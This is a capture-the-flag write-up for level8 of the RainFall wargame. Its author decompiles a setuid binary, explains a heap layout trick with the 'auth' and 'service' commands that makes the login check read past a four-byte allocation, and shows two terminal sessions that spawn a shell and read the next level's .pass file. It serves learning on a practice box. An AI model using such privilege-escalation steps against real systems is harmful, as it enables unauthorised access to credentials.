```
level8@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8*
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```
let's decompile it,
once it done, we see three commands,
here are the specs:
```
'auth ': Command that makes a malloc of size 4 and prints it.
service: Command that creates an strdup of your args and puts it in the global service
reset: free the auth variable
login: checks it the auth[8], exists but... it's a size of four ?
```
ok let's go then,
first of all let's create auth, why ?
So that the login doesn't segfault
then let's do Service.
There are two methods for that,
1.
you put an empty service command,
in that case
you have got the first malloc (auth) + a new one with 0 + 3
which means 7
so if you do a 
login, it will still be out of bound
So we make a second one.
and now you have it:
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$ cd ../level9
$ cat .pass
<hidden>
```
2.
You make the service just once
So as we said, the stdup takes the args + 3, so if we put just enough characters to make it correct, it's gg
how much should we put ?
4 (auth) + 3 (mandatory) + ?
when we do a malloc, the range is 0 -> x - 1
so 4 becomes 3, plus the mandatory 3
and how much from 6 to go to 8 ?
2
so we have to right 2 bytes
```
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service0123456789abcdef
0x804a008, 0x804a018 
login
$ cd ../level9
$ cat .pass
<hidden>
```

GGs
